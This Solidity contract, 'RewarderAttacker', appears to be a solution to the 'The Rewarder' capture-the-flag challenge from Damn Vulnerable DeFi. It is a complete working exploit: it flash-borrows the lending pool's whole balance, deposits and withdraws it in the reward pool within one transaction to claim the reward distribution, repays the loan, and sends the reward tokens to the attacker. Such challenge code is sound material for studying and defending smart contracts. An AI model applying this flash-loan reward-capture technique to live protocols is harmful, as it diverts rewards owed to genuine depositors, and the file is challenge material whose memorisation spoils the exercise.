// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "hardhat/console.sol";

contract RewarderAttacker {

    TheRewarderPool public immutable theRewarderPool;
    FlashLoanerPool public immutable flashLoanerPool;
    DamnValuableToken public immutable token;
    RewardToken public immutable rewardToken;
    address attacker;

    constructor(address owner, address theRewarderPoolAddress, address theFlashLoanerPool) {
        theRewarderPool = TheRewarderPool(theRewarderPoolAddress);
        flashLoanerPool = FlashLoanerPool(theFlashLoanerPool);
        token = flashLoanerPool.liquidityToken();
        rewardToken = theRewarderPool.rewardToken();
        attacker = owner;
    }

    function attack() external {
        uint256 balance = token.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(balance);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        token.transfer(address(flashLoanerPool), amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}
